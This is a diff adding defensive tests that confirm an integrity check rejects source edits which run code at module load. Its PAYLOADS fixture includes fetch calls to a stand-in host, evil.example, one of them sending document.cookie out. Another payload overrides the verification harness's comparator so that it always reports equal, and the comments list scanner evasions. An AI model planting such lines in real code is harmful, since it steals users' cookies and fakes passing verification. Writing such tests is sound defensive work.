@@ -136,3 +136,55 @@ test("the checks are cheap enough to always run", () => {
   const ms = (Date.now() - t0) / 50;
   assert.ok(ms < 40, `${ms.toFixed(1)} ms per run is too slow to be unconditional`);
 });
+
+// =============================================================================
+// THE MODULE-LOAD CHECK, THROUGH THE PUBLIC ENTRY POINT
+//
+// topLevelSideEffects has unit tests (sandboxIntegrity.test.ts) and they were
+// green through four rounds in which an audit defeated it three times. Green
+// unit tests on a function nobody proved was actually WIRED UP is a familiar
+// shape, and it is worth one test that goes in the front door.
+//
+// So: build a source edit the way the pipeline does, append a payload, and
+// assert worldIntegrityChecks refuses it -- and that an ordinary edit is not
+// refused, because a check that rejects normal code gets switched off.
+// =============================================================================
+const PAYLOADS: Record<string, string> = {
+  "a bare call": '\nfetch("https://evil.example/?c=" + document.cookie);\n',
+  "a second declarator after a function one":
+    '\nexport const _fmt = (n) => n, _boot = fetch("https://evil.example/x");\n',
+  "a regex after ) that used to unbalance the scanner":
+    '\nexport function _probe(s){ if (s) /[{]/.test(s); return s; }\nfetch("https://evil.example/x");\n',
+  "semicolon-free source": '\nfetch("https://evil.example/x")\n',
+  "reassigning the verification harness's own comparator":
+    "\nconst _a = () => {}; __deepEqual = () => true;\n",
+};
+
+const MODULE_LOAD_CHECK = "the world runs nothing at module load";
+
+for (const [name, payload] of Object.entries(PAYLOADS)) {
+  test(`integrity refuses a source edit carrying ${name}`, () => {
+    const results = worldIntegrityChecks(BASE, BASE + payload, false);
+    const check = results.find((r) => r.name === MODULE_LOAD_CHECK);
+    assert.ok(check, `the "${MODULE_LOAD_CHECK}" check must run on the source-edit path`);
+    assert.equal(check.pass, false, `this payload runs at module load and was reported clean:\n${payload}`);
+  });
+}
+
+test("integrity does NOT refuse an ordinary source edit", () => {
+  // An object literal whose values are arrows -- this repository's own
+  // public/buildings.js style, and a false positive in the scanner version
+  // before this one. Nothing here runs at module load.
+  const ordinary = BASE + `
+export const HEIGHT = {
+  TERRACE: (r) => 12 + r * 9,
+  TOWER: (r) => 62 + Math.pow(r, 1.9) * 205,
+};
+const half = (n) => n / 2;
+`;
+  const results = worldIntegrityChecks(BASE, ordinary, false);
+  const check = results.find((r) => r.name === MODULE_LOAD_CHECK);
+  assert.ok(check);
+  assert.equal(check.pass, true,
+    `ordinary code was refused -- that is how this check gets deleted: ${JSON.stringify(check)}`);
+});
